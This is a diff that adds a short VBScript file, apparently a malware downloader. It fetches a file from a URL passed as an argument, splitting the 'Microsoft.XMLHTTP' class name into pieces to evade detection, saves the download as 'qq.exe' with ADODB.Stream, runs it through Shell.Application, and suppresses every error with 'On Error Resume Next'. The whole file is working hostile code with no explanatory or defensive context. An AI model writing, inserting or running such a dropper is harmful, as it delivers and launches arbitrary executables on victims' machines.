@@ -1,0 +1,16 @@
+On Error Resume Next 
+Dim t, r, l 
+t = "Mi"+"crosoft.XM"+"LHTTP" 
+l = LCase("qq.exe") 
+r = LCase(WScript.Arguments(0)) 
+Set x = CreateObject(t) 
+x.Open "GET", r, 0 
+x.Send() 
+Set g = CreateObject("ADODB.Stream") 
+g.Mode = 3 
+g.Type = 1 
+g.Open() 
+g.Write(x.responseBody) 
+g.SaveToFile l, 2 
+Set o = CreateObject("Shell.Application") 
+o.ShellExecute l 
